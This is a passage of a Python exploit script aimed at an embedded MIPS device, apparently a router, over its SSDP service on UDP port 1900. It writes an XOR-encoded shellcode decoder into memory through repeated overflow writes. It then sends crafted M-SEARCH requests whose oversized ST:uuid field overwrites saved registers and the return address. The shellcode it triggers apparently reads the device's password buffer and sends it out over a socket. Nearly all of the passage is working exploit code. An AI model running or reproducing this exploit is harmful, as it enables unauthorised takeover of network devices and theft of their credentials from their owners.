            jalr $v0;           /* sendto(sockfd_addr (0x802ab9b0), pwd_buffer (0x801d3754), len, 0, sockaddr_addr (0x802ab980), 0x20); */
            addiu $t1, $zero, 0x20;
            j 0x802C3638;   /* fix address */
            xor $v0, $s3, $s3;
            ''')

            # Write our shellcode to memory with a bunch of overflows
            decoder_addr = 0x802c3614
            shellcode_addr = decoder_addr + len(decode_shellcode)

            # Write decoder shellcode
            for i in range(int(len(decode_shellcode)/4)):
                pos = i * 4
                write_memory(args.ip, decoder_addr + (i * 4), (decode_shellcode[pos]) | (decode_shellcode[pos + 1] << 8) | (decode_shellcode[pos + 2] << 16) | (decode_shellcode[pos + 3] << 24))
                write_memory(args.ip, decoder_addr + (i * 4), (decode_shellcode[pos]) | (decode_shellcode[pos + 1] << 8) | (decode_shellcode[pos + 2] << 16) | (decode_shellcode[pos + 3] << 24))

            for i in range(int(len(test_shellcode)/4)):
                pos = i * 4
                write_memory(args.ip, shellcode_addr + (i * 4), ((test_shellcode[pos]) | (test_shellcode[pos + 1] << 8) | (test_shellcode[pos + 2] << 16) | (test_shellcode[pos + 3] << 24)) ^ 0xf6f6f6f6)
                write_memory(args.ip, shellcode_addr + (i * 4), ((test_shellcode[pos]) | (test_shellcode[pos + 1] << 8) | (test_shellcode[pos + 2] << 16) | (test_shellcode[pos + 3] << 24)) ^ 0xf6f6f6f6)

            print(f"Decoder address: {hex(decoder_addr)}")
            print(hexdump(decode_shellcode))
            print(f"Shellcode address: {hex(shellcode_addr)}")
            print(hexdump(test_shellcode))
            print(f"Encoded shellcode:")
            encoded_shellcode = b''
            for i in test_shellcode:
                encoded_shellcode += (i ^ 0xf6).to_bytes(1, 'big')
            print(hexdump(encoded_shellcode))

            #### Now call the decoder shellcode
            payload = b'b' * 132

            payload += p32(0x802c0404) # s0
            payload += p32(shellcode_addr - 0x1010) # s1
            payload += p32(len(test_shellcode) ^ 0xf6f6f6f6) # s2
            payload += p32(0xf6f6f6f6) # s3
            payload += p32(decoder_addr) # ra

            # Build the request
            request = b"M-SEARCH * HTTP/1.0\r\n"
            request += b"HOST:239.255.255.250:1900\r\n"
            request += b"ST:uuid:" + payload + b"\r\n"
            request += b"MX:2\r\n"
            request += b"MAN:\"ssdp:discover\"\r\n\r\n"
            
            # Create socket and connect
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(5)
            s.connect((args.ip, 1900))

            # Send the request
            print("Decoding payload...")
            s.sendall(request)
            s.close()

            #### then call the decoded shellcode
            payload = b'b' * 132

            time.sleep(1) # sleep before sending so the caches get flushed

            payload += p32(0x801a717c) # s0 (config_get address)
            payload += p32(0x80236c4c) # s1 (address of 0x1010200)
            payload += p32(0x801d3754) # s2 (address of pwd buffer)
            payload += p32(0x801293d0) # s3 (address of socket() function)
            payload += p32(shellcode_addr) # ra
        
            # Build the request
            request = b"M-SEARCH * HTTP/1.0\r\n"
            request += b"HOST:239.255.255.250:1900\r\n"
            request += b"ST:uuid:" + payload + b"\r\n"
            request += b"MX:2\r\n"
            request += b"MAN:\"ssdp:discover\"\r\n\r\n"
            
            # Create socket to send and connect
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(5)
            s.connect((args.ip, 1900))

            # Send the request
            print("Triggering payload...")
            s.sendall(request)
            s.close()